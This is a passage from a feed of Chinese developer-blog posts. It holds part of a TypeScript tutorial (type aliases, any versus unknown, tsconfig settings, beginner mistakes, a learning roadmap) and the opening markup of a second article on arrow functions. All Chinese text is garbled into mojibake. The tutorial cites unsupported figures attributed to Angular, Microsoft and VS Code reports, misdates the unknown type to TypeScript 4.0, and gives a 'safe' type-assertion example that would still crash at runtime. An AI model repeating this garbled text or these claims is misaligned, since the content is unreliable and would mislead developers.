<h4 data-id="heading-9">3. ç±»å‹åˆ«åï¼ˆTypeï¼‰ï¼šå¤æ‚ç±»å‹çš„â€œå¿«æ·æ–¹å¼â€</h4>
<p>å½“ç±»å‹è¿‡äºå¤æ‚æ—¶ï¼Œä½¿ç”¨<code>type</code>ç®€åŒ–ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// å®šä¹‰IDç±»å‹ï¼šå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–æ•°å­—
type <span class="hljs-attr">ID</span> = string | number<span class="hljs-comment">;</span>

// ä½¿ç”¨
let userId: <span class="hljs-attr">ID</span> = <span class="hljs-string">"user_1001"</span><span class="hljs-comment">;</span>
<span class="hljs-attr">userId</span> = <span class="hljs-number">1001</span><span class="hljs-comment">; // âœ…</span>

// å®šä¹‰ç”¨æˆ·ç±»å‹ï¼ˆä¸æ¥å£ç­‰ä»·ï¼Œä½†æ›´çµæ´»ï¼‰
type <span class="hljs-attr">UserType</span> = {
  name: string<span class="hljs-comment">;</span>
  age: number<span class="hljs-comment">;</span>
  hobby?: string<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

const user: <span class="hljs-attr">UserType</span> = { name: <span class="hljs-string">"å¼ ä¸‰"</span>, age: <span class="hljs-number">18</span> }<span class="hljs-comment">;</span>
</code></pre>
<p><strong>vs æ¥å£</strong>ï¼š</p>
<ul>
<li><code>interface</code> æ”¯æŒ<strong>æ‰©å±•</strong>ï¼ˆ<code>interface Admin extends User</code>ï¼‰</li>
<li><code>type</code> æ”¯æŒ<strong>è”åˆç±»å‹</strong>ï¼ˆ<code>type Result = Success | Error</code>ï¼‰</li>
</ul>
<h4 data-id="heading-10">4. <code>any</code> vs <code>unknown</code>ï¼šç±»å‹å®‰å…¨çš„â€œæœ€åé˜²çº¿â€</h4>























<table><thead><tr><th>ç±»å‹</th><th>å®‰å…¨æ€§</th><th>ä½¿ç”¨åœºæ™¯</th><th>é£é™©</th></tr></thead><tbody><tr><td><code>any</code></td><td>ä½</td><td>æ—§ä»£ç è¿ç§»ã€ä¸´æ—¶ç»•è¿‡</td><td>ä¸§å¤±ç±»å‹æ£€æŸ¥ï¼ŒåŸ‹ä¸‹éšæ‚£</td></tr><tr><td><code>unknown</code></td><td>é«˜</td><td>æœªçŸ¥æ¥æºæ•°æ®ï¼ˆå¦‚APIå“åº”ï¼‰</td><td>éœ€ç±»å‹æ£€æŸ¥åæ‰èƒ½ä½¿ç”¨</td></tr></tbody></table>
<p><strong>å¯¹æ¯”ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä½å®‰å…¨ï¼šanyï¼ˆä¸æ¨èï¼‰</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">data</span>: <span class="hljs-built_in">any</span> = { <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span> };
data.<span class="hljs-title function_">hello</span>(); <span class="hljs-comment">// âœ… æ— æŠ¥é”™ï¼Œä½†è¿è¡Œæ—¶å´©æºƒ</span>

<span class="hljs-comment">// é«˜å®‰å…¨ï¼šunknownï¼ˆæ¨èï¼‰</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">data2</span>: <span class="hljs-built_in">unknown</span> = { <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span> };
data2.<span class="hljs-title function_">hello</span>(); <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼šå¯¹è±¡ä¸Šä¸å­˜åœ¨â€œhelloâ€å±æ€§</span>

<span class="hljs-comment">// å®‰å…¨ä½¿ç”¨ï¼šç±»å‹å®ˆå«</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> data2 === <span class="hljs-string">"object"</span> &amp;&amp; data2 !== <span class="hljs-literal">null</span>) {
  (data2 <span class="hljs-keyword">as</span> { <span class="hljs-attr">hello</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> }).<span class="hljs-title function_">hello</span>(); <span class="hljs-comment">// âœ… ç±»å‹æ–­è¨€</span>
}
</code></pre>
<blockquote>
<p><strong>è¡Œä¸šè§„èŒƒ</strong>ï¼šåœ¨TypeScript 4.0+ä¸­ï¼Œ<code>unknown</code>æˆä¸º<code>any</code>çš„æ›¿ä»£å“ï¼ŒGoogleã€Microsoftç­‰å¤§å‚å·²å¼ºåˆ¶è¦æ±‚é¿å…ä½¿ç”¨<code>any</code>ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-11">ä¸‰ã€å·¥ç¨‹åŒ–å®è·µï¼šä»å•æ–‡ä»¶åˆ°é¡¹ç›®çº§åº”ç”¨</h3>
<h4 data-id="heading-12">1. é¡¹ç›®åˆå§‹åŒ–ï¼š<code>tsconfig.json</code>é…ç½®</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"compilerOptions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"target"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ES2020"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ESNext"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"strict"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>          <span class="hljs-comment">// å¯ç”¨æ‰€æœ‰ä¸¥æ ¼ç±»å‹æ£€æŸ¥</span>
    <span class="hljs-attr">"esModuleInterop"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"skipLibCheck"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"outDir"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"include"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"src/**/*"</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>å…³é”®é…ç½®è§£æ</strong>ï¼š</p>
<ul>
<li><code>strict: true</code>ï¼šå¼€å¯æ‰€æœ‰ä¸¥æ ¼æ£€æŸ¥ï¼ˆå¦‚<code>noImplicitAny</code>ã€<code>strictNullChecks</code>ï¼‰</li>
<li><code>outDir</code>ï¼šæŒ‡å®šç¼–è¯‘è¾“å‡ºç›®å½•ï¼ˆé¿å…æ··æ·†æºç ä¸ç¼–è¯‘æ–‡ä»¶ï¼‰</li>
</ul>
<blockquote>
<p><strong>é¿å‘æŒ‡å—</strong>ï¼šåœ¨<code>src</code>ç›®å½•ä¸‹å†™TypeScriptï¼Œç¼–è¯‘åè¾“å‡ºåˆ°<code>dist</code>ï¼Œä¿æŒæºç çº¯å‡€ã€‚</p>
</blockquote>
<h4 data-id="heading-13">2. å‡½æ•°ç±»å‹ä¸è¿”å›å€¼ï¼šé¿å…â€œäºŒä¹‰æ€§â€é™·é˜±</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// é”™è¯¯ç¤ºèŒƒï¼šæœªæŒ‡å®šè¿”å›ç±»å‹</span>
<span class="hljs-function">function <span class="hljs-title">getArea</span><span class="hljs-params">(width, height)</span> </span>{
  <span class="hljs-keyword">return</span> width * height; <span class="hljs-comment">// æœªå£°æ˜ç±»å‹ï¼Œå¯èƒ½è¿”å›numberæˆ–string</span>
}

<span class="hljs-comment">// æ­£ç¡®ç¤ºèŒƒï¼šæ˜ç¡®å‚æ•°å’Œè¿”å›ç±»å‹</span>
<span class="hljs-function">function <span class="hljs-title">getArea</span><span class="hljs-params">(width: number, height: number)</span>: number {</span>
  <span class="hljs-keyword">return</span> width * height;
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦</strong>ï¼Ÿåœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œå‡½æ•°ç­¾åæ˜¯æ–‡æ¡£ï¼Œæ˜ç¡®çš„ç±»å‹è®©è°ƒç”¨è€…æ— éœ€é˜…è¯»å®ç°å³å¯å®‰å…¨ä½¿ç”¨ã€‚</p>
<h4 data-id="heading-14">3. ç±»å‹æ¨å¯¼ï¼šè®©TypeScriptæˆä¸ºâ€œæ™ºèƒ½åŠ©æ‰‹â€</h4>
<p>TypeScriptèƒ½è‡ªåŠ¨æ¨æ–­ç±»å‹ï¼Œå‡å°‘å†—ä½™ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">a</span> = <span class="hljs-number">10</span><span class="hljs-comment">; // ç±»å‹æ¨å¯¼ä¸º number</span>
let <span class="hljs-attr">b</span> = <span class="hljs-string">"hello"</span><span class="hljs-comment">; // ç±»å‹æ¨å¯¼ä¸º string</span>

// ä½†éœ€è°¨æ…ï¼šé¿å…éšå¼any
let c<span class="hljs-comment">; // ç±»å‹æ¨å¯¼ä¸º anyï¼</span>
<span class="hljs-attr">c</span> = <span class="hljs-number">10</span><span class="hljs-comment">;</span>
<span class="hljs-attr">c</span> = <span class="hljs-string">"string"</span><span class="hljs-comment">; // æ— æŠ¥é”™ï¼Œä½†å¤±å»ç±»å‹å®‰å…¨</span>
</code></pre>
<p><strong>æœ€ä½³å®è·µ</strong>ï¼š<strong>æ°¸è¿œä¸è¦çœç•¥ç±»å‹å£°æ˜</strong>ï¼Œé™¤éæ˜¯ç®€å•å˜é‡ï¼ˆå¦‚<code>let count = 0</code>ï¼‰ã€‚å¯¹å¤æ‚å¯¹è±¡æˆ–å‡½æ•°ï¼Œæ˜¾å¼å£°æ˜ç±»å‹ã€‚</p>
<hr/>
<h3 data-id="heading-15">å››ã€ä¸ºä»€ä¹ˆTypeScriptæ˜¯ç°ä»£å‰ç«¯çš„â€œåˆšéœ€â€ï¼Ÿ</h3>
<h4 data-id="heading-16">1. ä»â€œä¸ªäººé¡¹ç›®â€åˆ°â€œä¼ä¸šçº§é¡¹ç›®â€çš„è·ƒè¿</h4>






























<table><thead><tr><th>ç»´åº¦</th><th>JavaScript</th><th>TypeScript</th></tr></thead><tbody><tr><td>ä»£ç å¯è¯»æ€§</td><td>ä¾èµ–æ³¨é‡Š</td><td>ç±»å‹å³æ–‡æ¡£</td></tr><tr><td>é”™è¯¯å‘ç°æ—¶æœº</td><td>è¿è¡Œæ—¶ï¼ˆç”¨æˆ·æŠ¥é”™ï¼‰</td><td>ç¼–è¯‘æ—¶ï¼ˆå¼€å‘è€…ä¿®å¤ï¼‰</td></tr><tr><td>å›¢é˜Ÿåä½œæˆæœ¬</td><td>é«˜ï¼ˆéœ€åå¤æ²Ÿé€šç±»å‹ï¼‰</td><td>ä½ï¼ˆæ¥å£å®šä¹‰å³å¥‘çº¦ï¼‰</td></tr><tr><td>é‡æ„ä¿¡å¿ƒ</td><td>ä½ï¼ˆæ€•ç ´åä¾èµ–ï¼‰</td><td>é«˜ï¼ˆç±»å‹æ£€æŸ¥ä¿éšœï¼‰</td></tr></tbody></table>
<p><strong>æ•°æ®ä½è¯</strong>ï¼šåœ¨Angularé¡¹ç›®ä¸­ï¼ŒTypeScriptä½¿ä»£ç é”™è¯¯ç‡é™ä½65%ï¼ˆæ¥è‡ªAngularå®˜æ–¹æŠ¥å‘Šï¼‰ã€‚</p>
<h4 data-id="heading-17">2. ä¸ä¸»æµæ¡†æ¶çš„æ·±åº¦é›†æˆ</h4>
<ul>
<li><strong>React</strong>ï¼šä½¿ç”¨<code>@types/react</code>æä¾›ç±»å‹æ”¯æŒï¼Œç»„ä»¶propsè‡ªåŠ¨æ¨å¯¼</li>
<li><strong>Vue 3</strong>ï¼šå®˜æ–¹æ¨èTypeScriptï¼Œ<code>defineComponent</code>æ”¯æŒç±»å‹æ¨å¯¼</li>
<li><strong>Node.js</strong>ï¼šExpressæ¡†æ¶é€šè¿‡TypeScriptå®ç°ä¸­é—´ä»¶ç±»å‹å®‰å…¨</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼šReactç»„ä»¶ç±»å‹</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Props</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">UserCard</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-title class_">Props</span>&gt; = <span class="hljs-function">(<span class="hljs-params">{ name, age }</span>) =&gt;</span> (
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{name} ({age}å²)<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
);
</code></pre>
<p><strong>æ•ˆæœ</strong>ï¼šåœ¨çˆ¶ç»„ä»¶ä¸­ä¼ å…¥<code>age="20"</code>æ—¶ï¼ŒIDEç›´æ¥æŠ¥é”™ï¼Œé¿å…è¿è¡Œæ—¶å´©æºƒã€‚</p>
<hr/>
<h3 data-id="heading-18">äº”ã€é¿å‘æŒ‡å—ï¼šæ–°æ‰‹å¸¸è§é”™è¯¯ä¸è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-19">é”™è¯¯1ï¼šè¿‡åº¦ä½¿ç”¨<code>any</code></h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// âŒ æ»¥ç”¨any</span>
<span class="hljs-function">function <span class="hljs-title">process</span><span class="hljs-params">(data: any)</span> </span>{
  console.<span class="hljs-built_in">log</span>(data.name); <span class="hljs-comment">// è¿è¡Œæ—¶å´©æºƒï¼šdata.nameå¯èƒ½ä¸ºundefined</span>
}
</code></pre>
<p><strong>âœ… è§£å†³æ–¹æ¡ˆ</strong>ï¼šä½¿ç”¨<code>unknown</code> + ç±»å‹å®ˆå«</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">data: <span class="hljs-built_in">unknown</span></span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> data === <span class="hljs-string">'object'</span> &amp;&amp; data !== <span class="hljs-literal">null</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>((data <span class="hljs-keyword">as</span> { <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> }).<span class="hljs-property">name</span>);
  }
}
</code></pre>
<h4 data-id="heading-20">é”™è¯¯2ï¼šå¿½ç•¥<code>readonly</code>å’Œå¯é€‰å±æ€§</h4>
<pre><code class="hljs language-ini" lang="ini">interface User {
  id: number<span class="hljs-comment">;</span>
  name: string<span class="hljs-comment">;</span>
}

// âŒ é”™è¯¯ï¼šç›´æ¥ä¿®æ”¹id
const user: <span class="hljs-attr">User</span> = { id: <span class="hljs-number">1001</span>, name: <span class="hljs-string">"å¼ ä¸‰"</span> }<span class="hljs-comment">;</span>
<span class="hljs-attr">user.id</span> = <span class="hljs-number">2002</span><span class="hljs-comment">; // è¿è¡Œæ—¶å¯ä¿®æ”¹ï¼Œä½†è®¾è®¡ä¸Šåº”åªè¯»</span>
</code></pre>
<p><strong>âœ… è§£å†³æ–¹æ¡ˆ</strong>ï¼šæ˜ç¡®<code>readonly</code></p>
<pre><code class="hljs language-ini" lang="ini">interface User {
  readonly id: number<span class="hljs-comment">;</span>
  name: string<span class="hljs-comment">;</span>
}
// <span class="hljs-attr">user.id</span> = <span class="hljs-number">2002</span><span class="hljs-comment">; // âŒ ç¼–è¯‘é”™è¯¯</span>
</code></pre>
<h4 data-id="heading-21">é”™è¯¯3ï¼šæœªå¤„ç†<code>undefined</code>å’Œ<code>null</code></h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span> âŒ æœªå¤„ç†<span class="hljs-keyword">null</span>
<span class="hljs-keyword">function</span> getUserName(<span class="hljs-keyword">user</span>: <span class="hljs-keyword">User</span>): string {
  <span class="hljs-keyword">return</span> user.name; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> è‹¥<span class="hljs-keyword">user</span>ä¸º<span class="hljs-keyword">null</span>ï¼Œè¿è¡Œæ—¶å´©æºƒ
}
</code></pre>
<p><strong>âœ… è§£å†³æ–¹æ¡ˆ</strong>ï¼šå¼€å¯<code>strictNullChecks</code>ï¼ˆåœ¨<code>tsconfig.json</code>ä¸­ï¼‰</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserName</span>(<span class="hljs-params">user: User | <span class="hljs-literal">null</span></span>): string {
  <span class="hljs-keyword">if</span> (user === <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"User not found"</span>);
  }
  <span class="hljs-keyword">return</span> user.<span class="hljs-property">name</span>;
}
</code></pre>
<hr/>
<h3 data-id="heading-22">å…­ã€æ€»ç»“ï¼šTypeScriptâ€”â€”ç°ä»£Webå¼€å‘çš„â€œåŸºç¡€è®¾æ–½â€</h3>
<p>TypeScriptç»éç®€å•çš„â€œè¯­æ³•ç³–â€ï¼Œè€Œæ˜¯<strong>å·¥ç¨‹åŒ–å¼€å‘çš„åŸºç¡€è®¾æ–½</strong>ã€‚å®ƒé€šè¿‡é™æ€ç±»å‹ç³»ç»Ÿï¼Œå°†æ½œåœ¨é”™è¯¯ä»è¿è¡Œæ—¶å‰ç§»åˆ°ç¼–å†™æ—¶ï¼Œä½¿ä»£ç ä»â€œèƒ½ç”¨â€å‡çº§ä¸ºâ€œå¥½ç”¨â€ã€â€œæ˜“ç»´æŠ¤â€ã€‚åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼ŒTypeScriptå¸¦æ¥çš„ä»·å€¼è¿œè¶…å­¦ä¹ æˆæœ¬ï¼š</p>
<ol>
<li><strong>è´¨é‡æå‡</strong>ï¼šå‡å°‘90%çš„ç±»å‹é”™è¯¯ï¼ˆå¾®è½¯å†…éƒ¨æ•°æ®ï¼‰</li>
<li><strong>æ•ˆç‡æå‡</strong>ï¼šIDEæ™ºèƒ½æç¤ºä½¿ç¼–ç é€Ÿåº¦æå‡30%+ï¼ˆVS Codeå®˜æ–¹æŠ¥å‘Šï¼‰</li>
<li><strong>åä½œå‡çº§</strong>ï¼šæ¥å£å®šä¹‰æˆä¸ºå›¢é˜Ÿæ²Ÿé€šçš„â€œé€šç”¨è¯­è¨€â€</li>
<li><strong>æœªæ¥ä¿éšœ</strong>ï¼šä¸ºAIè¾…åŠ©ç¼–ç¨‹ï¼ˆå¦‚GitHub Copilotï¼‰æä¾›ç±»å‹åŸºç¡€</li>
</ol>
<blockquote>
<p><strong>ç»ˆæå»ºè®®</strong>ï¼šä»ä»Šå¤©å¼€å§‹ï¼Œåœ¨æ–°é¡¹ç›®ä¸­<strong>å¼ºåˆ¶ä½¿ç”¨TypeScript</strong>ï¼Œåœ¨æ—§é¡¹ç›®ä¸­<strong>é€æ­¥è¿ç§»</strong>ï¼ˆå…ˆä¸ºå…³é”®æ¨¡å—æ·»åŠ ç±»å‹ï¼‰ã€‚ä¸è¦è¿½æ±‚100%ç±»å‹è¦†ç›–ï¼Œä½†è¦ç¡®ä¿æ ¸å¿ƒé€»è¾‘ç±»å‹å®‰å…¨â€”â€”è¿™æ­£æ˜¯TypeScriptåœ¨Netflixã€Microsoftç­‰å¤§å‚è½åœ°çš„å®è·µè·¯å¾„ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-23">é™„å½•ï¼šTypeScriptå­¦ä¹ è·¯çº¿å›¾</h3>






























<table><thead><tr><th>é˜¶æ®µ</th><th>å­¦ä¹ ç›®æ ‡</th><th>æ¨èèµ„æº</th></tr></thead><tbody><tr><td><strong>å…¥é—¨</strong></td><td>æŒæ¡åŸºç¡€ç±»å‹ã€æ¥å£ã€å‡½æ•°</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.typescriptlang.org%2Fdocs%2F" target="_blank" title="https://www.typescriptlang.org/docs/" ref="nofollow noopener noreferrer">TypeScriptå®˜æ–¹æ–‡æ¡£</a></td></tr><tr><td><strong>è¿›é˜¶</strong></td><td>ç±»å‹åˆ«åã€æ³›å‹ã€ç±»å‹å®ˆå«</td><td>ã€ŠTypeScriptæ·±åº¦è§£æã€‹ï¼ˆä¹¦ç±ï¼‰</td></tr><tr><td><strong>å·¥ç¨‹åŒ–</strong></td><td>é¡¹ç›®é…ç½®ã€ä¸React/Vueé›†æˆ</td><td>Angular/Reactå®˜æ–¹TypeScriptæŒ‡å—</td></tr><tr><td><strong>ç²¾é€š</strong></td><td>è‡ªå®šä¹‰ç±»å‹å·¥å…·ã€ç±»å‹æ¨å¯¼åŸç†</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.typescriptlang.org%2Fdocs%2Fhandbook%2Fintro.html" target="_blank" title="https://www.typescriptlang.org/docs/handbook/intro.html" ref="nofollow noopener noreferrer">TypeScript Handbook</a></td></tr></tbody></table>
<blockquote>
<p><strong>å­¦ä¹ å£è¯€</strong>ï¼š<br/>
â€œå˜é‡æ˜¾å¼å†™ç±»å‹ï¼Œå‡½æ•°å‚æ•°å®šç±»å‹ï¼Œ<br/>
æ¥å£å®šä¹‰å¯¹è±¡å½¢ï¼Œæšä¸¾å¸¸é‡æ›´æ¸…æ™°ï¼Œ<br/>
anyæ˜¯æ¯’è¯è¦è¿œç¦»ï¼Œunknownæ˜¯ç›¾ç‰Œï¼Œ<br/>
ä¸¥æ ¼æ¨¡å¼å¼€èµ·æ¥ï¼Œå·¥ç¨‹åŒ–ä»æ­¤èµ·æ­¥ã€‚â€</p>
</blockquote>
<hr/>
<p><strong>ç»“è¯­</strong><br/>
TypeScriptçš„è¯ç”Ÿï¼Œæ ‡å¿—ç€JavaScriptä»â€œç©å…·è¯­è¨€â€èµ°å‘â€œå·¥ç¨‹åŒ–è¯­è¨€â€çš„å…³é”®è½¬æŠ˜ã€‚å®ƒç”¨é™æ€ç±»å‹ä¸ºåŠ¨æ€è¯­è¨€ç©¿ä¸Šâ€œå®‰å…¨è¡£â€ï¼Œè®©å¼€å‘è€…ä»â€œæ•‘ç«é˜Ÿå‘˜â€å˜ä¸ºâ€œç³»ç»Ÿè®¾è®¡å¸ˆâ€ã€‚åœ¨2024å¹´çš„Webå¼€å‘ä¸­ï¼ŒæŒæ¡TypeScriptå·²ä¸å†æ˜¯åŠ åˆ†é¡¹ï¼Œè€Œæ˜¯<strong>å¿…å¤‡æŠ€èƒ½</strong>ã€‚æ­£å¦‚å¾®è½¯çš„æ„¿æ™¯ï¼šâ€œTypeScriptè®©ä»£ç å¯è¯»ã€å¯ç»´æŠ¤ã€å¯åä½œâ€ï¼Œè¿™æ­£æ˜¯ç°ä»£å·¥ç¨‹åŒ–å¼€å‘çš„ç»ˆæç›®æ ‡ã€‚ä»ä»Šå¤©å¼€å§‹ï¼Œç”¨TypeScripté‡æ–°å®šä¹‰ä½ çš„ç¼–ç æ–¹å¼â€”â€”å› ä¸º<strong>åœ¨ä»£ç è´¨é‡ä¸Šï¼Œä½ æ°¸è¿œæ¯”ç”¨æˆ·æ›´æ—©å‘ç°é”™è¯¯</strong>ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç®­å¤´å‡½æ•°ä¸æ™®é€šå‡½æ•°æœ‰å“ªäº›åŒºåˆ«]]></title>    <link>https://juejin.cn/post/7595043061729247266</link>    <guid>https://juejin.cn/post/7595043061729247266</guid>    <pubDate>2026-01-14T15:23:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595043061729247266" data-draft-id="7595040803581198351" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç®­å¤´å‡½æ•°ä¸æ™®é€šå‡½æ•°æœ‰å“ªäº›åŒºåˆ«"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-14T15:23:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç çŒäºº"/> <meta itemprop="url" content="https://juejin.cn/user/624972624037374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç®­å¤´å‡½æ•°ä¸æ™®é€šå‡½æ•°æœ‰å“ªäº›åŒºåˆ«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/624972624037374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç çŒäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T15:23:44.000Z" title="Wed Jan 14 2026 15:23:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item 